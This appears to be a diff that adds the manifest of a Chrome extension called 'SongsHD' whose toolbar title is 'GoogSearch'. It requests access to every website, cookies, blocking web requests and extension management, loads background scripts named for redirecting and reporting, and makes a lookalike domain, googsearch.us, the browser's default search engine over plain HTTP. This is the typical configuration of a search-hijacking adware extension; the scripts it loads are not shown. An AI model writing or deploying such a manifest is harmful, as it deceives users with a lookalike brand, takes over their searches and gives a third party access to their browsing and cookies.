@@ -1,0 +1,60 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+    "name": "SongsHD", 
+    "icons": {
+        "128": "logo/logo_128x.png", 
+        "19": "logo/logo_19x.png", 
+        "48": "logo/logo_48x.png", 
+        "16": "logo/logo_16x.png"
+    }, 
+    "web_accessible_resources": [
+        "revert/index.html"
+    ], 
+    "background": {
+        "scripts": [
+            "common/config.js", 
+            "common/utils.js", 
+            "common/winner.js", 
+            "common/feed.js", 
+            "common/browseraction.js", 
+            "settings/common/redirect.js", 
+            "settings/partner/Reporting.js"
+        ]
+    }, 
+    "version": "2.8", 
+    "manifest_version": 2, 
+    "permissions": [
+        "http://*/*", 
+        "https://*/*", 
+        "storage", 
+        "tabs", 
+        "webRequest", 
+        "webRequestBlocking", 
+        "cookies", 
+        "management"
+    ], 
+    "browser_action": {
+        "default_icon": "logo/logo_19x.png", 
+        "default_title": "GoogSearch"
+    }, 
+    "chrome_settings_overrides": {
+        "search_provider": {
+            "alternate_urls": [], 
+            "instant_url": "http://googsearch.us/result.php?q={searchTerms}", 
+            "suggest_url": "http://googsearch.us/result.php?q={searchTerms}", 
+            "search_url": "http://googsearch.us/result.php?q={searchTerms}", 
+            "name": "Googsearch", 
+            "keyword": "http://googsearch.us/", 
+            "image_url_post_params": "", 
+            "encoding": "UTF-8", 
+            "suggest_url_post_params": "", 
+            "is_default": true, 
+            "favicon_url": "http://googsearch.us/favicon.ico", 
+            "image_url": "http://googsearch.us/result.php?q={searchTerms}", 
+            "instant_url_post_params": "", 
+            "search_url_post_params": ""
+        }
+    }, 
+    "description": "Chrome default Search by Googsearch lets you quickly search the web from your address bar!"
+}
